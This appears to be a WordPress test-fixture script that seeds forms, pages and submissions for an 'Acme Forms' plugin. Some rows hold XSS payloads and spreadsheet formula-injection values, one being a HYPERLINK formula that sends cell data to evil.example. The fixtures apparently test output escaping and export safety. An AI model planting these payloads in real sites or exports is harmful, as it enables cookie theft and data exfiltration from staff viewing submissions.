<?php
/**
 * Seed forms, pages and submissions (runs with `wp eval-file`).
 *
 * Contact form: 34 ordinary submissions (April–June 2026) plus special rows identified by their
 * e-mail address: mallory@ (markup in values), formula@/formula2@/formula3@ (spreadsheet
 * formulas), sentinel@ (January 2026), legacy1@ (stored by Acme Forms 1.x, serialized).
 * Job application: anna@ (2025, files incl. an HTML work sample), ben@ (2026, .docx).
 * Newsletter: a 1.x form (serialized field definitions) with three 1.x submissions.
 */

global $wpdb;
$table = $wpdb->prefix . 'acme_form_submissions';

function acme_seed_form( $title, $slug, $fields, $notify = true ) {
	$id = wp_insert_post(
		array(
			'post_type'   => 'acme_form',
			'post_status' => 'publish',
			'post_title'  => $title,
			'post_name'   => $slug,
		)
	);
	update_post_meta( $id, '_acme_form_fields', is_array( $fields ) && isset( $fields['__legacy'] ) ? $fields['__legacy'] : wp_slash( wp_json_encode( $fields ) ) );
	update_post_meta( $id, '_acme_form_notify', $notify ? '1' : '0' );
	return $id;
}

$contact = acme_seed_form(
	'Contact us',
	'contact-us',
	array(
		array( 'name' => 'name', 'label' => 'Your name', 'type' => 'text', 'required' => true ),
		array( 'name' => 'email', 'label' => 'E-mail', 'type' => 'email', 'required' => true ),
		array( 'name' => 'website', 'label' => 'Website', 'type' => 'url' ),
		array( 'name' => 'topic', 'label' => 'Topic', 'type' => 'select', 'options' => array( 'Sales', 'Support', 'Press' ) ),
		array( 'name' => 'message', 'label' => 'Message', 'type' => 'textarea', 'required' => true ),
	)
);

$jobs = acme_seed_form(
	'Job application',
	'job-application',
	array(
		array( 'name' => 'name', 'label' => 'Full name', 'type' => 'text', 'required' => true ),
		array( 'name' => 'email', 'label' => 'E-mail', 'type' => 'email', 'required' => true ),
		array( 'name' => 'website', 'label' => 'Portfolio website', 'type' => 'url' ),
		array( 'name' => 'cv', 'label' => 'CV', 'type' => 'file', 'required' => true, 'allowed' => 'pdf,doc,docx' ),
		array( 'name' => 'sample', 'label' => 'Work sample', 'type' => 'file', 'allowed' => 'pdf,png,jpg,html' ),
		array( 'name' => 'photo', 'label' => 'Photo', 'type' => 'file' ),
		array( 'name' => 'notes', 'label' => 'Cover letter', 'type' => 'textarea' ),
	)
);

// Acme Forms 1.x: serialized field definitions with `title` instead of `label`.
$newsletter = acme_seed_form(
	'Newsletter',
	'newsletter',
	array(
		'__legacy' => array(
			array( 'name' => 'email', 'title' => 'E-mail address', 'type' => 'email', 'required' => 1 ),
			array( 'name' => 'first_name', 'title' => 'First name', 'type' => 'text' ),
		),
	),
	false
);

foreach ( array( 'Contact' => $contact, 'Careers' => $jobs, 'Newsletter' => $newsletter ) as $title => $form_id ) {
	wp_insert_post(
		array(
			'post_type'    => 'page',
			'post_status'  => 'publish',
			'post_title'   => $title,
			'post_content' => '[acme_form id="' . $form_id . '"]',
		)
	);
}

function acme_seed_row( $form_id, $email, array $data, $created, $status = 'read', $files = array(), $legacy = false ) {
	global $wpdb;
	$wpdb->insert(
		$wpdb->prefix . 'acme_form_submissions',
		array(
			'form_id'    => $form_id,
			'status'     => $status,
			'email'      => $email,
			'ip'         => '203.0.113.' . wp_rand( 2, 250 ),
			'data'       => $legacy ? serialize( $data ) : wp_json_encode( $data ),
			'files'      => $legacy ? '' : wp_json_encode( (object) $files ),
			'created_at' => $created,
		)
	);
	return (int) $wpdb->insert_id;
}

// Ordinary contact requests, oldest first: 2026-04-01 … 2026-06-30.
$topics = array( 'Sales', 'Support', 'Press' );
$start  = strtotime( '2026-04-01 09:00:00 UTC' );
for ( $i = 1; $i <= 34; $i++ ) {
	$n = sprintf( '%02d', $i );
	acme_seed_row(
		$contact,
		"visitor{$n}@example.org",
		array(
			'name'    => "Visitor {$n}",
			'email'   => "visitor{$n}@example.org",
			'website' => 0 === $i % 3 ? "https://visitor{$n}.example" : '',
			'topic'   => $topics[ $i % 3 ],
			'message' => "Hello, this is question number {$n}.\nThanks!",
		),
		gmdate( 'Y-m-d H:i:s', $start + ( $i - 1 ) * 64 * HOUR_IN_SECONDS ),
		$i <= 20 ? 'read' : 'new'
	);
}

acme_seed_row(
	$contact,
	'mallory@example.org',
	array(
		'name'    => '<script>alert("acme-xss-1")</script>',
		'email'   => 'mallory@example.org',
		'website' => 'javascript:alert(document.cookie)',
		'topic'   => '',
		'message' => 'Nice site <img src=x onerror=alert("acme-xss-2")> see you',
	),
	'2026-06-20 10:00:00',
	'new'
);
acme_seed_row(
	$contact,
	'formula@example.org',
	array(
		'name'    => '=HYPERLINK("http://evil.example/?d="&A1,"Click me")',
		'email'   => 'formula@example.org',
		'website' => 'https://formula.example',
		'topic'   => 'Sales',
		'message' => '+SUM(1,2)',
	),
	'2026-06-21 11:00:00',
	'new'
);
acme_seed_row(
	$contact,
	'formula2@example.org',
	array(
		'name'    => '@cmd',
		'email'   => 'formula2@example.org',
		'website' => '',
		'topic'   => 'Press',
		'message' => '-2+3',
	),
	'2026-06-22 12:00:00',
	'new'
);
acme_seed_row(
	$contact,
	'formula3@example.org',
	array(
		'name'    => "\tTabbed Name",
		'email'   => 'formula3@example.org',
		'website' => 'www.formula3.example',
		'topic'   => 'Press',
		'message' => "\rStarts with a carriage return",
	),
	'2026-06-23 13:00:00',
	'new'
);
acme_seed_row(
	$contact,
	'sentinel@example.org',
	array(
		'name'    => 'Sentinel Sam',
		'email'   => 'sentinel@example.org',
		'website' => '',
		'topic'   => 'Sales',
		'message' => 'Please keep this record.',
	),
	'2026-01-15 08:30:00'
);
// Stored by Acme Forms 1.x (serialized PHP array, no files column content).
acme_seed_row(
	$contact,
	'legacy1@example.org',
	array(
		'name'    => 'Lena Legacy',
		'email'   => 'legacy1@example.org',
		'message' => 'Sent with the old 1.x form.',
	),
	'2025-03-02 16:45:00',
	'read',
	array(),
	true
);

acme_seed_row(
	$jobs,
	'anna@example.org',
	array(
		'name'    => 'Anna Andersson',
		'email'   => 'anna@example.org',
		'website' => 'https://anna.example',
		'notes'   => 'I would love to join the design team.',
	),
	'2025-11-12 14:20:00',
	'read',
	array(
		'cv'     => array( 'name' => 'cv-anna.pdf', 'path' => '2025/11/cv-anna.pdf', 'type' => 'application/pdf', 'size' => filesize( __DIR__ . '/files/cv-anna.pdf' ) ),
		'sample' => array( 'name' => 'portfolio.html', 'path' => '2025/11/portfolio.html', 'type' => 'text/html', 'size' => filesize( __DIR__ . '/files/portfolio.html' ) ),
	)
);
acme_seed_row(
	$jobs,
	'ben@example.org',
	array(
		'name'    => 'Ben Brooks',
		'email'   => 'ben@example.org',
		'website' => '',
		'notes'   => '',
	),
	'2026-05-03 09:10:00',
	'new',
	array(
		'cv' => array( 'name' => 'cv-ben.docx', 'path' => '2026/05/cv-ben.docx', 'type' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'size' => filesize( __DIR__ . '/files/cv-ben.docx' ) ),
	)
);

foreach ( array( 'news1' => '2024-02-01 10:00:00', 'news2' => '2024-05-11 10:00:00', 'news3' => '2024-09-30 10:00:00' ) as $who => $when ) {
	acme_seed_row(
		$newsletter,
		"{$who}@example.org",
		array(
			'email'      => "{$who}@example.org",
			'first_name' => ucfirst( $who ),
		),
		$when,
		'read',
		array(),
		true
	);
}

update_option(
	'acme_forms_settings',
	array(
		'notify_email'   => 'jobs@acme-recruiting.example',
		'subject_prefix' => '[Acme Recruiting]',
		'store_ip'       => 1,
		'max_upload_mb'  => 5,
		'per_page'       => 20,
	)
);

WP_CLI::log( 'Seeded ' . (int) $wpdb->get_var( "SELECT COUNT(*) FROM {$table}" ) . ' submissions.' );
